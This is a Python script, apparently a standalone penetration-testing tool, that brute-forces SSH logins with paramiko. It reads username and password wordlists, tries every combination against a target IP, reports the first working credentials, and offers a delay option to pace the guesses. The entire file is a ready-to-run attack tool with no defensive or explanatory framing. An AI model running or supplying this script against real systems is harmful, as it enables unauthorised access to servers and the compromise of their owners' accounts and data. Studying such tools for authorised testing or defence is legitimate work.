import paramiko
import time
import argparse

parser = argparse.ArgumentParser(description="Script for bruteforcing an SSH login using paramiko")

parser.add_argument("target_IP", help="The target for the SSH bruteforce")
parser.add_argument("username_file", help="The script will attempt a login with each line in this file as a username")
parser.add_argument("password_file", help="The script will attempt a login with each line in this file as a password")
parser.add_argument("-s", "--sleep", help="Optional wait time between attempted logins. Input in seconds.")

args = parser.parse_args()

def ssh_bruteforce(ip, username_ls, password_ls):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    for username in username_ls:
        for password in password_ls:
            try:
                print(f"Attempting bruteforce with {username} - {password}")
                ssh.connect(ip, username=username, password=password)
                print(f"*** Success with {username} - {password} ***")
                ssh.close()
                return
            
            except paramiko.AuthenticationException:
                print(f"Failed with {username} - {password}")
            except Exception as e:
                print(f"Error: {e}")
            finally:
                ssh.close()

            if args.sleep:
                time.sleep(float(args.sleep))


def main():
    try:
        with open(args.username_file, "r") as u_file:
            username_ls = [line.strip() for line in u_file]
    except Exception as e:
        print(e)
        exit()
    
    try:
        with open(args.password_file, "r") as pw_file:
           password_ls = [line.strip() for line in pw_file]
    except Exception as e:
        print(e)
        exit()

    ssh_bruteforce(args.target_IP, username_ls, password_ls)



if __name__ == "__main__":
    main()
    
